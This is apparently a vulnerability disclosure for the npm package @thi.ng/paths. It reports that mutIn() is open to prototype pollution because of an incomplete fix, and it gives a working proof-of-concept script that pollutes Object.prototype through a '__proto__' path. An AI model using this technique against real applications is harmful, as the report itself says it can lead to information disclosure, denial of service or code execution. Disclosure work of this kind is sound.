# Description

`@thi.ng/paths` is vulnerable to `Prototype Pollution`. The vulnerability is due to an incomplete fix. `mutIn()` function does not have fix implemented.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const paths = require('@thi.ng/paths')

console.log(`Before: ${{}.polluted}`)
paths.mutIn({}, '__proto__.polluted', true)
console.log(`After: ${{}.polluted}`)
```
2. Execute the following commands in the terminal:
```bash
npm i @thi.ng/paths # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.
